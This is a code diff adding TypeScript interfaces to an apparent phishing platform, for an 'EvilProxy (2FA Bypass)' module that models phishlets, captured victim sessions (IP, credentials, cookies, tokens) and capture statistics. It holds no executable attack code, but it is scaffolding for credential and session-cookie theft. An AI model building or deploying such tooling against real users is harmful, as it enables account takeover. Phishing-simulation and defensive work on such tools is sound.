@@ -428,3 +428,55 @@ export interface CampaignStats {
   events: TrackingEvent[]
   credentials: CapturedCredential[]
 }
+
+// ============== EvilProxy (2FA Bypass) ==============
+
+export interface Phishlet {
+  id?: string
+  name: string
+  description?: string
+  target_domain: string
+  phishing_domain: string
+  proxy_port: number
+  ssl_enabled: boolean
+  capture_cookies: string[]
+  capture_fields: string[]
+  auth_urls: string[]
+  replacements: Record<string, string>
+  status: 'stopped' | 'running'
+  created_at?: string
+}
+
+export interface PhishletTemplate {
+  id: string
+  name: string
+  description: string
+  target_domain: string
+  phishing_domain: string
+  capture_cookies: string[]
+  capture_fields: string[]
+  auth_urls: string[]
+  replacements: Record<string, string>
+}
+
+export interface CapturedProxySession {
+  id?: string
+  phishlet_id: string
+  victim_ip: string
+  user_agent: string
+  credentials: Record<string, string>
+  cookies: Record<string, string>
+  tokens: Record<string, string>
+  authenticated: boolean
+  captured_at: string
+  last_activity: string
+}
+
+export interface EvilProxyStats {
+  total_phishlets: number
+  running_phishlets: number
+  total_sessions: number
+  authenticated_sessions: number
+  credentials_captured: number
+  cookies_captured: number
+}
